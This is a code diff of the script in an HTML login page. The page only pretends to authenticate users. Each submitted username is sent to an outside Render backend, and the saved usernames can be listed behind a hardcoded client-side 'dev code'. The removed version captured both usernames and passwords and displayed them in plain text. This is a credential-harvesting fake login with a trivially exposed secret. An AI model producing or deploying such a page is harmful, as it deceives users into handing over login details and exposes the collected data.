@@ -332,67 +332,82 @@
   </div>
 
   <script>
-    const credentials = [];
-    const DEV_CODE = 'jackson';
+  // 🔗 Connect to your live Render backend
+  const BACKEND = "https://skip-client-login.onrender.com"; // ⬅️ change if your Render URL is different
+  const DEV_CODE = "jackson";
 
-    // Create and place random tiny stars
-    const tinyStarsContainer = document.querySelector('.tiny-stars');
-    for (let i = 0; i < 100; i++) {
-      const star = document.createElement('div');
-      star.classList.add('tiny-star');
-      star.style.width = star.style.height = (Math.random() * 2 + 1) + 'px';
-      star.style.top = (Math.random() * 100) + 'vh';
-      star.style.left = (Math.random() * 100) + 'vw';
-      star.style.animationDuration = (2 + Math.random() * 3) + 's';
-      star.style.animationDelay = (Math.random() * 3) + 's';
-      tinyStarsContainer.appendChild(star);
+  async function saveUsername(username) {
+    try {
+      await fetch(`${BACKEND}/api/entries`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username })
+      });
+    } catch (err) {
+      console.error("Server save failed:", err);
+    }
+  }
+
+  async function fetchDevEntries(code) {
+    try {
+      const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
+      if (!res.ok) throw new Error("Invalid dev code or server error.");
+      const data = await res.json();
+      return data.entries || [];
+    } catch (err) {
+      console.error(err);
+      alert("Error fetching dev data.");
+      return [];
+    }
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async function (event) {
+    event.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+    const devOutput = document.getElementById("devOutput");
+
+    devOutput.style.display = "none";
+    devOutput.textContent = "";
+
+    if (!username || !password) {
+      alert("Please enter both username and password.");
+      return;
     }
 
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault();
+    // 🧠 Save username to backend
+    await saveUsername(username);
 
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value;
-      const devOutput = document.getElementById('devOutput');
+    alert("Logged in as: " + username);
 
-      devOutput.style.display = 'none';
-      devOutput.textContent = '';
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  });
 
-      if (!username || !password) {
-        alert('Please enter both username and password.');
-        return;
+  document.getElementById("showDevBtn").addEventListener("click", async function () {
+    const code = prompt("Enter Dev Access Code:");
+    const devOutput = document.getElementById("devOutput");
+
+    if (code === DEV_CODE) {
+      const entries = await fetchDevEntries(code);
+
+      if (entries.length === 0) {
+        devOutput.textContent = "No usernames saved yet.";
+      } else {
+        let output = "🧠 DEV USERNAME LIST:\n\n";
+        entries.forEach((e, i) => {
+          output += `${i + 1}. Username: ${e.username}\n   Created: ${new Date(e.createdAt).toLocaleString()}\n\n`;
+        });
+        devOutput.textContent = output.trim();
       }
 
-      credentials.push({ username, password });
-
-      alert('Logged in as: ' + username);
-
-      document.getElementById('username').value = '';
-      document.getElementById('password').value = '';
-    });
-
-    document.getElementById('showDevBtn').addEventListener('click', function () {
-      const code = prompt("Enter Dev Access Code:");
-
-      if (code === DEV_CODE) {
-        const devOutput = document.getElementById('devOutput');
-
-        if (credentials.length === 0) {
-          devOutput.textContent = 'No login data available.';
-        } else {
-          let output = 'DEV CREDENTIAL LIST:\n\n';
-          credentials.forEach((cred, index) => {
-            output += `${index + 1}. Username: ${cred.username}\n   Password: ${cred.password}\n\n`;
-          });
-          devOutput.textContent = output.trim();
-        }
-
-        devOutput.style.display = 'block';
-      } else if (code !== null) {
-        alert('Incorrect dev code. Access denied.');
-      }
-    });
-  </script>
+      devOutput.style.display = "block";
+    } else if (code !== null) {
+      alert("Incorrect dev code. Access denied.");
+    }
+  });
+</script>
 
 </body>
 </html>
